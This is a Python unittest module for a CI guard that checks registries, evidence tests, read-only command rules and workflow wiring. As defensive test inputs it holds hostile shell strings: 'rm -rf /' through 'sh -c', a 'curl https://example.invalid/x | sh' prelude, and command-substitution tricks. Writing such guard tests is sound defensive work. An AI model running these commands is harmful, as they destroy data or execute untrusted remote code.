"""Exercise the structural guard for the reference-acceptance entry point.

The guard is a **structure** check: site inventory, registry anchors, probe
coverage, read-only argv, workflow wiring and the output contract. These tests pin
the behaviour it claims, including the cases the previous revision got wrong
(keyword hand-off, truthiness of a result object, deleting a registry row).
"""

from __future__ import annotations

import ast
import importlib.util
import os
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path
from types import ModuleType
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "scripts/dev-env/ci-entry-guard.py"
ENTRY = ROOT / "scripts/dev-env/reference-acceptance.py"
WORKFLOW = ROOT / ".github/workflows/ci.yml"
DOC = ROOT / "docs/operations/reference-acceptance.md"


def _load_guard() -> ModuleType:
    spec = importlib.util.spec_from_file_location("ci_entry_guard_under_test", SCRIPT)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


GUARD = _load_guard()


def audit(
    source: str, *, baseline: tuple[object, ...] = (), require_sites: bool = False
) -> list[str]:
    problems = GUARD.audit_sources(
        textwrap.dedent(source),
        label="fixture.py",
        baseline=baseline,
        require_sites=require_sites,
    )
    return [str(problem) for problem in problems]


SITE = GUARD.SiteRow("step:('docker', 'compose', 'up', '-d')", "fixture", "probe:gate_verdict-fail")


class AnchorTests(unittest.TestCase):
    """The registries and the documentation block must not drift apart."""

    def test_the_checked_in_anchor_matches_the_script(self) -> None:
        self.assertEqual(GUARD.check_anchor(), [])
        self.assertEqual(GUARD.check_counts(), [])

    def test_a_tampered_documentation_block_is_red(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "reference-acceptance.md"
            text = DOC.read_text(encoding="utf-8")
            copied.write_text(
                text.replace("| `step_gate:argv` |", "| `step_gate:removed` |"), encoding="utf-8"
            )
            problems = GUARD.check_anchor(copied)
        self.assertTrue(problems, "改文档表的行必须红")
        self.assertIn("不一致", problems[0])

    def test_a_missing_anchor_is_red(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "doc.md"
            copied.write_text("# 没有锚点\n", encoding="utf-8")
            problems = GUARD.check_anchor(copied)
        self.assertTrue(problems)
        self.assertIn("tables --write", problems[0])

    def test_a_shrunk_table_without_touching_the_pin_is_red(self) -> None:
        # Derived from the live registries, so growing a table cannot leave a stale
        # copy here that silently makes this case vacuous.
        shrunk = {
            "MUTATE_SITES": len(GUARD.MUTATE_SITES) - 1,
            "READ_ARGUMENTS": len(GUARD.READ_ARGUMENTS),
            "WRITE_TOKENS": len(GUARD.WRITE_TOKENS),
            "PROBE_CASES": len(GUARD.PROBE_CASES),
            "DECLARED_DEFERRALS": len(GUARD.DECLARED_DEFERRALS),
            "SELFTEST_CASES": len(GUARD.SELFTEST_CASES),
        }
        with mock.patch.object(GUARD, "PINNED_COUNTS", shrunk):
            problems = GUARD.check_counts()
        self.assertTrue(problems)
        self.assertIn("MUTATE_SITES", problems[0])

    def test_every_registration_points_at_something_that_exists(self) -> None:
        self.assertEqual(GUARD.audit_evidence(), [])
        broken = (GUARD.SiteRow("step_x:argv", "fixture", "test:test_that_does_not_exist"),)
        with mock.patch.object(GUARD, "MUTATE_SITES", broken):
            problems = GUARD.audit_evidence()
        self.assertTrue(problems)
        self.assertIn("test*.py 模块里", problems[0])


EVIDENCE_FIXTURE = """
import sys
import unittest

FLAG = len(["a"]) > 1
SKIP_ON_WINDOWS = False
SKIP_ON_CI = sys.platform == "win32"
REBOUND_FLAG = False


def _rebind_flag():
    global REBOUND_FLAG
    REBOUND_FLAG = True


# A feature flag is initialised once and then mutated by a form that is not a plain
# `Assign`. Every one of these is a second binding, so none of them is provable and a
# skip condition built on one must stay red.
FOR_FLAG = False
for FOR_FLAG in (True,):
    pass
AUG_FLAG = False
AUG_FLAG |= True
TUP_FLAG = False
TUP_FLAG, _TUP_REST = True, True


class FixtureTest(unittest.TestCase):
    def test_asserts(self):
        self.assertEqual(len(["a"]), 1)

    def test_without_any_assertion(self):
        value = 1
        return None

    @unittest.skip("parked")
    def test_skipped_by_decorator(self):
        self.assertEqual(len(["a"]), 1)

    def test_skipped_in_body(self):
        self.skipTest("parked")
        self.assertEqual(len(["a"]), 1)

    def test_truncated_before_the_body(self):
        return
        self.assertEqual(len(["a"]), 1)

    def test_constant_branch_return(self):
        if True:
            return
        self.assertEqual(len(["a"]), 1)

    def test_constant_assertion(self):
        self.assertTrue(True)

    def test_assertion_swallowed_by_try(self):
        try:
            self.assertEqual(len(["a"]), 2)
        except AssertionError:
            pass

    def test_duplicated_evidence(self):
        self.assertEqual(len(["a"]), 1)

    def test_duplicated_evidence(self):
        return

    @unittest.expectedFailure
    def test_expected_failure(self):
        self.assertEqual(len(["a"]), 2)

    @unittest.skipIf(False, "never on this platform")
    def test_skip_if_literal_false(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(FLAG, "not literal")
    def test_skip_if_unknown(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(sys.platform == "win32", "windows only")
    def test_skip_if_windows(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipUnless(sys.platform != "win32", "not windows")
    def test_skip_unless_not_windows(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(sys.platform.startswith("win"), "windows only")
    def test_skip_if_windows_prefix(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(SKIP_ON_WINDOWS, "module constant, false on linux")
    def test_skip_if_module_constant_false(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(SKIP_ON_CI, "module constant derived from sys.platform")
    def test_skip_if_platform_constant(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipUnless(sys.platform == "win32", "windows only")
    def test_skip_unless_windows(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(True, "always")
    def test_skip_if_true(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(REBOUND_FLAG, "module constant rebound at runtime")
    def test_skip_if_rebound_constant(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(FOR_FLAG, "module constant rebound by a for target")
    def test_skip_if_constant_rebound_by_a_for_target(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(AUG_FLAG, "module constant rebound by an augmented assignment")
    def test_skip_if_constant_rebound_by_an_augassign(self):
        self.assertEqual(len(["a"]), 1)

    @unittest.skipIf(TUP_FLAG, "module constant rebound by an unpacking assignment")
    def test_skip_if_constant_rebound_by_unpacking(self):
        self.assertEqual(len(["a"]), 1)

    def test_business_object_skip(self):
        queue = Queue()
        queue.skip("not a unittest skip")
        self.assertEqual(len(["a"]), 1)


class Queue:
    def skip(self, reason):
        return reason


class PlatformFixtureTest(unittest.TestCase):
    def setUp(self):
        if sys.platform == "win32":
            self.skipTest("windows cannot run the fake runner")

    def test_platform_fixture_guard(self):
        self.assertEqual(len(["a"]), 1)


class UnknownFixtureTest(unittest.TestCase):
    def setUp(self):
        if FLAG:
            self.skipTest("fixture unavailable")

    def test_unknown_fixture_guard(self):
        self.assertEqual(len(["a"]), 1)


class RebindingTest(unittest.TestCase):
    def test_rebound_evidence(self):
        self.assertEqual(len(["a"]), 1)

    test_rebound_evidence = unittest.skip("rebound")(test_rebound_evidence)


class FirstAmbiguousTest(unittest.TestCase):
    def test_ambiguous_evidence(self):
        self.assertEqual(len(["a"]), 1)


class SecondAmbiguousTest(unittest.TestCase):
    def test_ambiguous_evidence(self):
        self.assertEqual(len(["a"]), 1)


@unittest.skip("whole class parked")
class SkippedClassTest(unittest.TestCase):
    def test_class_level_skip(self):
        self.assertEqual(len(["a"]), 1)


class FixtureSkipTest(unittest.TestCase):
    def setUp(self):
        self.skipTest("fixture unavailable")

    def test_set_up_skip(self):
        self.assertEqual(len(["a"]), 1)


class SkippedBaseTest(unittest.TestCase):
    def test_a_base_case(self):
        self.assertEqual(len(["a"]), 1)


@unittest.skip("base parked")
class SkippedBaseClassTest(SkippedBaseTest):
    pass


class InheritedClassSkipTest(SkippedBaseClassTest):
    def test_inherited_class_skip(self):
        self.assertEqual(len(["a"]), 1)


class BaseFixtureSkipTest(unittest.TestCase):
    def setUp(self):
        self.skipTest("base fixture unavailable")


class InheritedFixtureSkipTest(BaseFixtureSkipTest):
    def test_inherited_fixture_skip(self):
        self.assertEqual(len(["a"]), 1)


class ModuleRebindingTest(unittest.TestCase):
    def test_module_rebound_evidence(self):
        self.assertEqual(len(["a"]), 1)


# One indent left of the class-body form: at runtime `unittest` still reports
# `OK (skipped=1)`, so the module-level binding has to be red as well.
ModuleRebindingTest.test_module_rebound_evidence = unittest.skip("rebound")(
    ModuleRebindingTest.test_module_rebound_evidence
)


def test_a_module_level_function():
    assert len(["a"]) == 1
"""

DECOY_FIXTURE = """
import unittest


class DecoyTest(unittest.TestCase):
    def test_decoy_evidence(self):
        self.assertEqual(len(["a"]), 1)
"""


class RegistryRubricTests(unittest.TestCase):
    """The `judgement` and `evidence` columns must be checkable, not decorative."""

    def _workspace(self, directory: str) -> Path:
        root = Path(directory)
        (root / "tests/ci").mkdir(parents=True)
        (root / "tests/ci/test_fixture_evidence.py").write_text(EVIDENCE_FIXTURE, encoding="utf-8")
        (root / "tests/ci/helper_evidence.py").write_text(DECOY_FIXTURE, encoding="utf-8")
        return root

    def _evidence_problems(self, evidence: str) -> list[str]:
        row = GUARD.SiteRow("step_x:argv", "fixture", evidence)
        with tempfile.TemporaryDirectory() as directory:
            root = self._workspace(directory)
            with (
                mock.patch.object(GUARD, "ROOT", root),
                mock.patch.object(GUARD, "MUTATE_SITES", (row,)),
            ):
                return [str(problem) for problem in GUARD.audit_evidence()]

    def _assert_red(self, evidence: str, expected: str) -> None:
        problems = self._evidence_problems(evidence)
        self.assertTrue(problems, f"{evidence} 必须红")
        self.assertIn(expected, problems[0])

    def test_an_asserting_test_case_method_is_accepted(self) -> None:
        self.assertEqual(self._evidence_problems("test:test_asserts"), [])

    def test_an_evidence_test_without_an_assertion_is_red(self) -> None:
        self._assert_red("test:test_without_any_assertion", "没有任何断言")

    def test_a_skipped_evidence_test_is_red(self) -> None:
        self._assert_red("test:test_skipped_by_decorator", "会被跳过或不算失败")

    def test_skip_inside_the_body_is_red_too(self) -> None:
        self._assert_red("test:test_skipped_in_body", "skipTest")

    def test_an_emptied_evidence_body_is_red(self) -> None:
        self._assert_red("test:test_truncated_before_the_body", "死代码")

    def test_a_constant_branch_return_is_red(self) -> None:
        self._assert_red("test:test_constant_branch_return", "死代码")

    def test_a_constant_assertion_is_red(self) -> None:
        self._assert_red("test:test_constant_assertion", "恒真")

    def test_an_assertion_swallowed_by_try_is_red(self) -> None:
        self._assert_red("test:test_assertion_swallowed_by_try", "吞")

    def test_a_duplicated_evidence_definition_is_red(self) -> None:
        self._assert_red("test:test_duplicated_evidence", "定义了 2 次")

    def test_expected_failure_is_red(self) -> None:
        self._assert_red("test:test_expected_failure", "expectedFailure")

    def test_a_class_level_skip_is_red(self) -> None:
        self._assert_red("test:test_class_level_skip", "类 `SkippedClassTest` 上的")

    def test_a_skip_promoted_to_a_base_class_is_red(self) -> None:
        self._assert_red("test:test_inherited_class_skip", "类 `SkippedBaseClassTest` 上的")

    def test_a_fixture_skip_promoted_to_a_base_class_is_red(self) -> None:
        self._assert_red("test:test_inherited_fixture_skip", "`BaseFixtureSkipTest.setUp` 里的")

    def test_a_fixture_level_skip_is_red(self) -> None:
        self._assert_red("test:test_set_up_skip", "setUp")

    def test_a_skip_condition_that_is_not_literal_is_red(self) -> None:
        self._assert_red("test:test_skip_if_unknown", "不是字面量")

    def test_a_skip_condition_that_is_false_is_green(self) -> None:
        self.assertEqual(self._evidence_problems("test:test_skip_if_literal_false"), [])

    def test_platform_skip_conditions_that_never_trigger_on_ci_are_green(self) -> None:
        for evidence in (
            "test:test_skip_if_windows",
            "test:test_skip_unless_not_windows",
            "test:test_skip_if_windows_prefix",
            "test:test_skip_if_module_constant_false",
            "test:test_skip_if_platform_constant",
            "test:test_platform_fixture_guard",
        ):
            with self.subTest(evidence=evidence):
                self.assertEqual(self._evidence_problems(evidence), [])

    def test_platform_skip_conditions_that_trigger_on_ci_are_red(self) -> None:
        self._assert_red("test:test_skip_unless_windows", "不会运行")
        self._assert_red("test:test_skip_if_true", "不会运行")

    def test_a_rebound_module_constant_is_not_proof(self) -> None:
        self._assert_red("test:test_skip_if_rebound_constant", "不是字面量")

    def test_a_constant_rebound_by_a_for_target_is_not_proof(self) -> None:
        self._assert_red("test:test_skip_if_constant_rebound_by_a_for_target", "不是字面量")

    def test_a_constant_rebound_by_an_augassign_is_not_proof(self) -> None:
        self._assert_red("test:test_skip_if_constant_rebound_by_an_augassign", "不是字面量")

    def test_a_constant_rebound_by_unpacking_is_not_proof(self) -> None:
        self._assert_red("test:test_skip_if_constant_rebound_by_unpacking", "不是字面量")

    def test_only_a_single_module_level_assignment_is_a_provable_constant(self) -> None:
        # Every form the old predicate ignored. Each one is a second binding of `F`, so
        # the module-level value is no longer the value `unittest` evaluates.
        bindings = (
            "for F in (True,):\n    pass",
            "F |= True",
            "F, _rest = True, True",
            "with open('/dev/null') as F:\n    pass",
            "try:\n    pass\nexcept Exception as F:\n    pass",
            "[F for F in (True,)]",
            "(F := True)",
            "import os as F",
            "def F():\n    pass",
            "class F:\n    pass",
            "del F",
        )
        for binding in bindings:
            with self.subTest(binding=binding):
                source = f"F = False\n{binding}\n"
                self.assertEqual(GUARD._module_constants(ast.parse(source)), {})
        self.assertEqual(GUARD._module_constants(ast.parse("F = False\n")), {"F": False})
        self.assertEqual(GUARD._module_constants(ast.parse("F: bool = False\n")), {"F": False})

    def test_a_type_alias_is_not_a_provable_constant(self) -> None:
        # PEP 695 `type X = …` is a static binding like `def`/`class`; leaving it out
        # made `FLAG = False` + `type FLAG = int` + `@skipIf(FLAG)` green while the
        # case really ran as `OK (skipped=1)`.
        source = (
            "FLAG = False\n"
            "type FLAG = int\n"
            "@unittest.skipIf(FLAG, 'skip')\n"
            "def test_x():\n"
            "    pass\n"
        )
        self.assertEqual(GUARD._module_constants(ast.parse(source)), {})

    def test_a_module_level_rebinding_of_the_evidence_is_red(self) -> None:
        self._assert_red("test:test_module_rebound_evidence", "模块顶层被重新绑定")

    def test_an_unknown_fixture_guard_is_red(self) -> None:
        self._assert_red("test:test_unknown_fixture_guard", "skipTest")

    def test_a_class_body_rebinding_of_the_evidence_is_red(self) -> None:
        self._assert_red("test:test_rebound_evidence", "重新绑定")

    def test_a_name_defined_in_two_classes_is_red(self) -> None:
        self._assert_red("test:test_ambiguous_evidence", "同名出现")

    def test_a_qualified_registration_resolves_a_duplicated_name(self) -> None:
        self.assertEqual(
            self._evidence_problems(
                "test:test_fixture_evidence.py::SecondAmbiguousTest::test_ambiguous_evidence"
            ),
            [],
        )
        self._assert_red(
            "test:test_fixture_evidence.py::NoSuchTest::test_ambiguous_evidence", "不存在"
        )

    def test_a_business_object_skip_method_is_not_a_unittest_skip(self) -> None:
        self.assertEqual(self._evidence_problems("test:test_business_object_skip"), [])

    def test_a_module_level_function_is_not_a_runnable_evidence(self) -> None:
        self._assert_red("test:test_a_module_level_function", "`TestCase` 类里")

    def test_a_module_unittest_does_not_collect_is_not_evidence(self) -> None:
        self._assert_red("test:test_decoy_evidence", "test*.py 模块里")

    def test_a_judgement_pointer_must_name_a_real_entry_definition(self) -> None:
        self.assertEqual(GUARD.check_judgements(ENTRY), [])
        for judgement, expected in (
            ("谁也没判", "没有反引号"),
            ("`gate_verdict_removed` 判定", "没有定义它"),
        ):
            with self.subTest(judgement=judgement):
                row = GUARD.SiteRow("step_x:argv", judgement, "probe:gate_verdict-fail")
                with mock.patch.object(GUARD, "MUTATE_SITES", (row,)):
                    problems = GUARD.check_judgements(ENTRY)
                self.assertTrue(problems)
                self.assertIn(expected, problems[0])

    def test_a_duplicated_site_row_is_red(self) -> None:
        rows = (
            GUARD.SiteRow("step_x:argv", "`step_gate` 判", "probe:gate_verdict-fail"),
            GUARD.SiteRow("step_x:argv", "`step_stack` 判", "probe:gate_verdict-fail"),
        )
        with mock.patch.object(GUARD, "MUTATE_SITES", rows):
            problems = GUARD.check_judgements(ENTRY)
        self.assertTrue(problems)
        self.assertIn("登记了多次", problems[0])


class ModuleIndexCacheTests(unittest.TestCase):
    """The parse cache must key on content, not on a stamp that can be restored."""

    def test_a_rewrite_with_a_restored_stamp_is_reparsed(self) -> None:
        # `os.utime`, `cp -p`, `rsync -a` and tar extraction all restore `mtime_ns`;
        # a stamp-keyed cache would then answer with the AST of the previous content.
        before = (
            "import unittest\n\n\n"
            "class M(unittest.TestCase):\n"
            "    def test_memo(self):\n"
            "        self.assertEqual(len(['a']), 1)\n"
        )
        after = before.replace("test_memo", "test_mem0")
        self.assertEqual(len(before), len(after))
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "tests/ci/test_memo_evidence.py"
            path.parent.mkdir(parents=True)
            path.write_text(before, encoding="utf-8")
            stamp = path.stat()
            with mock.patch.object(GUARD, "ROOT", Path(directory)):
                self.assertEqual(
                    [match.klass.name for match in GUARD._find_tests("test_memo")], ["M"]
                )
            path.write_text(after, encoding="utf-8")
            os.utime(path, ns=(stamp.st_atime_ns, stamp.st_mtime_ns))
            self.assertEqual(path.stat().st_size, stamp.st_size)
            self.assertEqual(path.stat().st_mtime_ns, stamp.st_mtime_ns)
            with mock.patch.object(GUARD, "ROOT", Path(directory)):
                self.assertEqual(GUARD._find_tests("test_memo"), [])
                self.assertEqual(
                    [match.klass.name for match in GUARD._find_tests("test_mem0")], ["M"]
                )


class SiteInventoryTests(unittest.TestCase):
    def test_the_real_entry_matches_its_registry(self) -> None:
        problems, summary = GUARD.run_sites(ENTRY)
        self.assertEqual(problems, [], summary)
        self.assertIn(f"{len(GUARD.MUTATE_SITES)} registered", summary)

    def test_a_deleted_write_command_is_red(self) -> None:
        source = textwrap.dedent(
            """
            def step(ctx):
                started = ctx.mutate(('docker', 'compose', 'up', '-d'))
                return started.ok
            """
        )
        problems = GUARD.audit_sources(source, label="fixture.py", baseline=(SITE,))
        self.assertEqual(problems, [])
        without = source.replace("ctx.mutate(('docker', 'compose', 'up', '-d'))", "1")
        problems = GUARD.audit_sources(without, label="fixture.py", baseline=(SITE,))
        self.assertTrue(problems, "删掉写命令必须红")
        self.assertIn("登记的写命令消失了", problems[0])

    def test_an_added_write_command_is_red(self) -> None:
        source = textwrap.dedent(
            """
            def step(ctx):
                started = ctx.mutate(('docker', 'compose', 'up', '-d'))
                other = ctx.mutate(('docker', 'compose', 'down'))
                return started.ok, other.ok
            """
        )
        problems = GUARD.audit_sources(source, label="fixture.py", baseline=(SITE,))
        self.assertTrue(problems)
        self.assertIn("未登记的写命令", problems[0])

    def test_the_receiver_name_does_not_hide_a_site(self) -> None:
        source = (
            "def step(ctx):\n"
            "    started = ctx.runner.mutate(('docker', 'compose', 'up', '-d'))\n"
            "    return started\n"
        )
        self.assertEqual(audit(source, baseline=(SITE,)), [])
        problems = audit(source)
        self.assertTrue(problems)
        self.assertIn("未登记的写命令", problems[0])

    def test_unrelated_read_methods_are_not_entry_calls(self) -> None:
        source = textwrap.dedent(
            """
            def step(ctx, handle):
                chunk = handle.read(1 << 20)
                response = handle.read().decode()
                return chunk, response
            """
        )
        self.assertEqual(audit(source), [])

    def test_a_discarded_result_is_red(self) -> None:
        source = "def step(ctx):\n    ctx.mutate(('docker', 'compose', 'up', '-d'))\n"
        problems = audit(source, baseline=(SITE,))
        self.assertTrue(problems)
        self.assertIn("被丢弃", problems[0])

    def test_a_result_assigned_to_underscore_is_a_discard(self) -> None:
        source = "def step(ctx):\n    _ = ctx.mutate(('docker', 'compose', 'up', '-d'))\n"
        problems = audit(source, baseline=(SITE,))
        self.assertTrue(problems)
        self.assertIn("赋给 `_`", problems[0])

    def test_a_bare_result_name_in_a_condition_is_red(self) -> None:
        for test in (
            "if started:",
            "if not started:",
            "if started is not None:",
            "if started is None:",
            "assert started",
        ):
            with self.subTest(test=test):
                source = (
                    "def step(ctx):\n"
                    "    started = ctx.mutate(('docker', 'compose', 'up', '-d'))\n"
                    f"    {test}\n"
                    "        return 'ok'\n"
                )
                problems = audit(source, baseline=(SITE,))
                self.assertTrue(problems, f"{test} 必须红")

    def test_reading_ok_is_still_green(self) -> None:
        source = textwrap.dedent(
            """
            def step(ctx):
                started = ctx.mutate(('docker', 'compose', 'up', '-d'))
                if not started.ok:
                    raise RuntimeError('failed')
                return started.code
            """
        )
        self.assertEqual(audit(source, baseline=(SITE,)), [])

    def test_a_hand_off_to_a_helper_is_green(self) -> None:
        source = textwrap.dedent(
            """
            def step(ctx):
                applied = ctx.mutate(('docker', 'compose', 'up', '-d'))
                judge(result=applied)
                judge(applied)
                return applied
            """
        )
        self.assertEqual(audit(source, baseline=(SITE,)), [])

    def test_read_boundary(self) -> None:
        cases = {
            "literal down": ("ctx.read(('docker', 'compose', 'down'))", True),
            "literal run": ("ctx.read(('docker', 'compose', 'run', 'api'))", True),
            "sh -c": ("ctx.read(('sh', '-c', 'touch /tmp/x'))", True),
            "python -c": ("ctx.read(('python3', '-c', 'print(1)'))", True),
            "uv run": ("ctx.read(('uv', 'run', '--locked', 'python', 'x.py'))", False),
            "uv run then compose run": (
                "ctx.read(('uv', 'run', 'docker', 'compose', 'run', '-d', 'api'))",
                True,
            ),
            "registered builder": ("ctx.read(psql_argv(ctx, 'SELECT 1'))", False),
            "unknown builder": ("ctx.read(shoot())", True),
            "variable argv": ("argv = ('docker', 'compose', 'down')\n    ctx.read(argv)", None),
            "value wrapper": ("ctx.read(('git', '-C', str(ctx.repo_root), 'status'))", False),
            "registered spread": ("ctx.read((*ctx.compose_argv, 'ps', '-a'))", False),
            "unregistered spread": (
                "argv = ('sh', '-c', 'rm -rf /')\n    ctx.read((*argv,))",
                True,
            ),
            "unregistered attribute spread": ("ctx.read((*ctx.extra_argv, 'ps'))", True),
        }
        for name, (statement, expected_red) in cases.items():
            with self.subTest(name):
                if statement.startswith("argv ="):
                    source = f"def step(ctx):\n    {statement}\n"
                else:
                    source = f"def step(ctx):\n    {statement}\n"
                problems = audit(source)
                if expected_red is None or expected_red:
                    self.assertTrue(problems, f"{name} 必须红")
                else:
                    self.assertEqual(problems, [], f"{name} 必须绿")

    def test_an_empty_module_cannot_vacuously_pass(self) -> None:
        problems = GUARD.audit_sources(
            "def nothing(ctx):\n    return 1\n", label="fixture.py", baseline=(), require_sites=True
        )
        self.assertTrue(problems)
        self.assertIn("空转", problems[0])


class SelftestCorpusTests(unittest.TestCase):
    def test_the_corpus_passes(self) -> None:
        self.assertEqual(GUARD.selftest(), [])

    def test_weakening_the_write_tokens_breaks_the_corpus(self) -> None:
        with mock.patch.object(GUARD, "WRITE_TOKENS", ("run",)):
            problems = GUARD.selftest()
        self.assertTrue(problems, "把写词表缩成 {run} 必须让自检红")
        self.assertIn("read-literal-write", "\n".join(problems))


class ProbeRegistryTests(unittest.TestCase):
    def test_the_real_entry_passes_every_registered_case(self) -> None:
        problems, summary = GUARD.run_probe(ENTRY)
        self.assertEqual(problems, [], summary)
        self.assertIn(f"{len(GUARD.PROBE_CASES)} cases", summary)

    def test_an_emptied_judgement_function_is_red(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "entry.py"
            text = ENTRY.read_text(encoding="utf-8")
            start = text.index("def migration_verify(")
            end = text.index("\ndef ", start + 1)
            copied.write_text(
                text[:start]
                + "def migration_verify(head, database_version):\n    return None\n"
                + text[end:],
                encoding="utf-8",
            )
            problems, _summary = GUARD.run_probe(copied)
        self.assertTrue(problems)
        self.assertIn("migration_verify", "\n".join(problems))

    def test_a_probe_row_without_an_implementation_is_red(self) -> None:
        extra = GUARD.ProbeRow("ghost-case", "migration_verify", "fixture")
        # The anchor is regenerated by the same tables, so patching only the
        # registry also proves the anchor check sees the drift.
        with mock.patch.object(GUARD, "PROBE_CASES", (*GUARD.PROBE_CASES, extra)):
            problems, _summary = GUARD.run_probe(ENTRY)
        self.assertTrue(problems)
        message = "\n".join(problems)
        self.assertIn("不一致", message)
        self.assertIn("ghost-case", message)

    def test_an_emptied_bucket_names_probe_is_red(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "entry.py"
            text = ENTRY.read_text(encoding="utf-8")
            emptied = text.replace(
                "def bucket_names(ctx: Context) -> list[str]:",
                "def bucket_names(ctx: Context) -> list[str]:\n    return []",
                1,
            )
            copied.write_text(emptied, encoding="utf-8")
            problems, _summary = GUARD.run_probe(copied)
        self.assertTrue(problems)
        self.assertIn("bucket_names", "\n".join(problems))

    def test_renaming_a_probed_function_points_at_the_registry(self) -> None:
        table = tuple(
            GUARD.ProbeRow(row.case, "environment_gaps", row.expectation, row.must_raise)
            if row.function == "env_gaps"
            else row
            for row in GUARD.PROBE_CASES
        )
        with mock.patch.object(GUARD, "PROBE_CASES", table):
            problems, _summary = GUARD.run_probe(ENTRY)
        self.assertTrue(problems)
        message = "\n".join(problems)
        self.assertIn("找不到入口函数", message)
        self.assertIn("PROBE_CASES", message)


class WiringTests(unittest.TestCase):
    def _prelude_problems(self, prelude: str) -> list[str]:
        """`wiring` problems after putting `prelude` in front of the `sites` command."""
        text = WORKFLOW.read_text(encoding="utf-8")
        guarded = text.replace(
            "          python3 scripts/dev-env/ci-entry-guard.py sites",
            f"          {prelude}\n          python3 scripts/dev-env/ci-entry-guard.py sites",
        )
        self.assertNotEqual(text, guarded)
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "ci.yml"
            copied.write_text(guarded, encoding="utf-8")
            problems, _summary = GUARD.run_wiring(copied)
        return [str(problem) for problem in problems]

    def _workflow_problems(self, replace: tuple[str, str], count: int = -1) -> list[str]:
        text = WORKFLOW.read_text(encoding="utf-8")
        replaced = text.replace(*replace, count)
        self.assertNotEqual(text, replaced)
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "ci.yml"
            copied.write_text(replaced, encoding="utf-8")
            problems, _summary = GUARD.run_wiring(copied)
        return [str(problem) for problem in problems]

    def test_the_checked_in_workflow_runs_every_guard_as_the_first_command(self) -> None:
        problems, summary = GUARD.run_wiring(WORKFLOW)
        self.assertEqual(problems, [], summary)
        self.assertIn("4 guard steps", summary)

    def test_an_echo_only_replacement_is_red(self) -> None:
        text = WORKFLOW.read_text(encoding="utf-8")
        replaced = text.replace(
            "          python3 scripts/dev-env/ci-entry-guard.py sites",
            '          echo "python3 scripts/dev-env/ci-entry-guard.py sites"',
        )
        self.assertNotEqual(text, replaced)
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "ci.yml"
            copied.write_text(replaced, encoding="utf-8")
            problems, _summary = GUARD.run_wiring(copied)
        self.assertTrue(problems)
        message = "\n".join(problems)
        self.assertIn("echo", message)
        self.assertIn("sites", message)

    def test_a_shell_prelude_before_the_guard_command_is_green(self) -> None:
        # `set -euo pipefail` is normal hardening, not a claim about the guard
        # command; rejecting it was a false red.
        text = WORKFLOW.read_text(encoding="utf-8")
        guarded = text.replace(
            "          python3 scripts/dev-env/ci-entry-guard.py sites",
            "          set -euo pipefail\n"
            "          python3 scripts/dev-env/ci-entry-guard.py sites",
        )
        self.assertNotEqual(text, guarded)
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "ci.yml"
            copied.write_text(guarded, encoding="utf-8")
            problems, _summary = GUARD.run_wiring(copied)
        self.assertEqual(problems, [], "\n".join(problems))

    def test_a_real_command_before_the_guard_command_is_red(self) -> None:
        text = WORKFLOW.read_text(encoding="utf-8")
        replaced = text.replace(
            "          python3 scripts/dev-env/ci-entry-guard.py sites",
            "          docker compose config --quiet\n"
            "          python3 scripts/dev-env/ci-entry-guard.py sites",
        )
        self.assertNotEqual(text, replaced)
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "ci.yml"
            copied.write_text(replaced, encoding="utf-8")
            problems, _summary = GUARD.run_wiring(copied)
        self.assertTrue(problems)
        self.assertIn("前面还有会先执行的命令", "\n".join(problems))

    def test_a_colon_prelude_with_a_parameter_expansion_is_green(self) -> None:
        # `: "${VAR:?missing}"` is the standard no-op guard and must stay green; the
        # prelude separator is `\s|$` rather than `\b` for exactly this line.
        self.assertEqual(self._prelude_problems(': "${VAR:?missing}"'), [])

    def test_a_colon_prelude_that_writes_is_red(self) -> None:
        problems = self._prelude_problems(": > /tmp/ci-entry-guard-write-probe")
        self.assertTrue(problems)
        message = "\n".join(problems)
        self.assertIn("会先执行的命令", message)
        self.assertIn("/tmp/ci-entry-guard-write-probe", message)

    def test_every_writing_colon_prelude_is_red(self) -> None:
        for prelude in (
            ": > /tmp/ci-entry-guard-write-probe",
            ": >> /tmp/ci-entry-guard-write-probe",
            ": ; rm -rf /tmp/ci-entry-guard-write-probe",
            ": && curl https://example.invalid/x | sh",
            ": $(rm -rf /tmp/ci-entry-guard-write-probe)",
            ": `rm -rf /tmp/ci-entry-guard-write-probe`",
        ):
            with self.subTest(prelude=prelude):
                self.assertTrue(self._prelude_problems(prelude))

    def test_a_command_substitution_in_another_prelude_is_red(self) -> None:
        # `export`/`cd` could already carry `$(…)` and `&&` before `:` was allowed; the
        # operator limit covers them too.
        self.assertTrue(self._prelude_problems("export FOO=$(rm -rf /tmp/ci-entry-guard-probe)"))
        self.assertTrue(self._prelude_problems("export FOO=<(rm -rf /tmp/ci-entry-guard-probe)"))
        self.assertTrue(self._prelude_problems("cd /tmp && rm -rf /tmp/ci-entry-guard-probe"))

    def test_a_line_continuation_prelude_is_red(self) -> None:
        # A trailing `\` joins the next line into this one, so `: \` swallows the
        # guard command into the no-op and the guard never runs.
        problems = self._prelude_problems(": \\")
        self.assertTrue(problems)
